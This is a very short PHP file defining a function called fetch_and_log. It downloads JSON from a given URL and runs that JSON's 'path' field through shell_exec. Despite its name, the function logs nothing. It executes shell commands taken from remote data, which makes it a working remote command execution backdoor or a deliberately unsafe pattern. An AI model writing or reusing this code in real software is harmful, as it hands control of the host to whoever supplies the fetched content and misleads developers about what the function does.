<?php
function fetch_and_log($url) {
  $raw = file_get_contents($url);
  $data = json_decode($raw, true);
  return shell_exec($data['path']);
}
